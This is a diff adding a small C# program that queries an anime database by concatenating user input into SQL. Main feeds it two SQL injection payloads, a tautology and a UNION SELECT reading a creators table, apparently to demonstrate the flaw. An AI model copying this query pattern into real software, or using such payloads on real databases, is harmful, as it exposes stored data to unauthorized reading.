@@ -1,0 +1,31 @@
+using System;
+using System.Data.SqlClient;
+
+class Program
+{
+    static void UnsafeGetAnime(string userInput)
+    {
+        string connectionString = "Server=localhost;Database=AnimeDB;Trusted_Connection=True;";
+
+        using (SqlConnection conn = new SqlConnection(connectionString))
+        {
+            conn.Open();
+            string query = "SELECT * FROM anime WHERE name = '" + userInput + "'";
+
+            SqlCommand cmd = new SqlCommand(query, conn);
+
+            SqlDataReader reader = cmd.ExecuteReader();
+
+            while (reader.Read())
+            {
+                Console.WriteLine(reader["name"]);
+            }
+        }
+    }
+
+    static void Main()
+    {
+        UnsafeGetAnime("' OR 1=1 -- ");
+        UnsafeGetAnime("' UNION SELECT id, description, NULL, 'creator', NULL, NULL, NULL, NULL, name FROM creators -- ");
+    }
+}
